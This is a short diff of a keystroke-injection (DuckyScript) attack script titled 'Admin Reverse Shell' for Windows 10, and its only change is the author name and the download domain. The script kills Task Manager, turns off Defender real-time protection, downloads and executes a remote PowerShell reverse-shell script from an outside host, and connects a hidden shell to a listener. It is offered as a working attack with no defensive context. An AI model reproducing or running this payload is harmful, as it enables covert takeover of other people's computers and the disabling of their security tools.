@@ -1,5 +1,5 @@
 REM Title: Admin Reverse Shell  
-REM Author: CayleRose
+REM Author: CayleRose1
 REM Target: Windows 10 (CMD, PowerShell)  
 REM Description: Launches elevated CMD, kills Task Manager, disables Defender, and executes hidden reverse shell via PowerShell  
 REM  
@@ -27,5 +27,5 @@ ENTER
 DELAY 500
 
 REM → Execute payload: kill Task Manager, disable Defender, launch reverse shell
-STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR 'https://ps1.CayleRose.com/remote-access/Invoke-ConPtyShell.ps1' -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]
+STRING taskkill /IM taskmgr.exe && powershell -WindowStyle hidden Set-MpPreference -DisableRealtimeMonitoring $true; IEX(IWR 'https://ps1.CayleRose1.com/remote-access/Invoke-ConPtyShell.ps1' -UseBasicParsing); Invoke-ConPtyShell [LISTENER_IP_ADDRESS] [PORT]
 ENTER
